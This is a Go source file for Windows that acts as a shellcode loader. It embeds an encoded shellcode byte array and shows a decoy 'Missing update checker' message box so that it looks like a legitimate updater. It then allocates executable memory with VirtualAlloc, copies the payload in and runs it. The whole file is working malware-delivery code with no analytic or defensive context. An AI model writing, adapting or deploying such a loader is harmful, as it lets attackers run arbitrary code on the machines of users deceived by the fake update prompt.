package main

import (
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT = 0x1000
	///MEM_RESERVE            = 0x2000
	//PAGE_READWRITE = 0x04
	//PAGE_EXECUTE_READ = 0x20
	PAGE_EXECUTE_READWRITE = 0x40
)

func main() {

	shell := []byte{0xda, 0xcc, 0xd9, 0x74, 0x24, 0xf4, 0x5b, 0xba, 0xcf, 0xf7, 0x38, 0x39, 0x29, 0xc9, 0xb1, 0x31, 0x31, 0x53, 0x18, 0x3, 0x53, 0x18, 0x83, 0xc3, 0xcb, 0x15, 0xcd, 0xc5, 0x3b, 0x5b, 0x2e, 0x36, 0xbb, 0x3c, 0xa6, 0xd3, 0x8a, 0x7c, 0xdc, 0x90, 0xbc, 0x4c, 0x96, 0xf5, 0x30, 0x26, 0xfa, 0xed, 0xc3, 0x4a, 0xd3, 0x2, 0x64, 0xe0, 0x5, 0x2c, 0x75, 0x59, 0x75, 0x2f, 0xf5, 0xa0, 0xaa, 0x8f, 0xc4, 0x6a, 0xbf, 0xce, 0x1, 0x96, 0x32, 0x82, 0xda, 0xdc, 0xe1, 0x33, 0x6f, 0xa8, 0x39, 0xbf, 0x23, 0x3c, 0x3a, 0x5c, 0xf3, 0x3f, 0x6b, 0xf3, 0x88, 0x19, 0xab, 0xf5, 0x5d, 0x12, 0xe2, 0xed, 0x82, 0x1f, 0xbc, 0x86, 0x70, 0xeb, 0x3f, 0x4f, 0x49, 0x14, 0x93, 0xae, 0x66, 0xe7, 0xed, 0xf7, 0x40, 0x18, 0x98, 0x1, 0xb3, 0xa5, 0x9b, 0xd5, 0xce, 0x71, 0x29, 0xce, 0x68, 0xf1, 0x89, 0x2a, 0x89, 0xd6, 0x4c, 0xb8, 0x85, 0x93, 0x1b, 0xe6, 0x89, 0x22, 0xcf, 0x9c, 0xb5, 0xaf, 0xee, 0x72, 0x3c, 0xeb, 0xd4, 0x56, 0x65, 0xaf, 0x75, 0xce, 0xc3, 0x1e, 0x89, 0x10, 0xac, 0xff, 0x2f, 0x5a, 0x40, 0xeb, 0x5d, 0x1, 0xe, 0xea, 0xd0, 0x3f, 0x7c, 0xec, 0xea, 0x3f, 0xd0, 0x85, 0xdb, 0xb4, 0xbf, 0xd2, 0xe3, 0x1e, 0x84, 0x2d, 0xae, 0x3, 0xac, 0xa5, 0x77, 0xd6, 0xed, 0xab, 0x87, 0xc, 0x31, 0xd2, 0xb, 0xa5, 0xc9, 0x21, 0x13, 0xcc, 0xcc, 0x6e, 0x93, 0x3c, 0xbc, 0xff, 0x76, 0x43, 0x13, 0xff, 0x52, 0x20, 0xf2, 0x93, 0x3f, 0x89, 0x91, 0x13, 0xa5, 0xd5}
	executeshell(shell)
}

func executeshell(shellcode []byte) {

	//var OLD_PAGE_READWRITE uint32 = 0x04

	//var exeread uint32 = 0x20
	k32 := syscall.MustLoadDLL("kernel32.dll")
	valloc := k32.MustFindProc("VirtualAlloc")

	usr32 := syscall.MustLoadDLL("user32.dll")
	msgbox := usr32.MustFindProc("MessageBoxW")

	dlgTitle := "Missing update checker"
	dlgMsg := "Please confirm to proceed with missing update checker."

	msgbox.Call(0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(dlgMsg))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(dlgTitle))),
		0)

	//vprotect := k32.MustFindProc("VirtualProtect")

	//make space for shellcode
	addr, _, _ := valloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	ptrtoaddressallocated := (*[6500]byte)(unsafe.Pointer(addr))
	//now copy our shellcode to the ptrtoaddressallocated
	for i, value := range shellcode {
		ptrtoaddressallocated[i] = value
	}

	syscall.Syscall(addr, 0, 0, 0, 0)

}
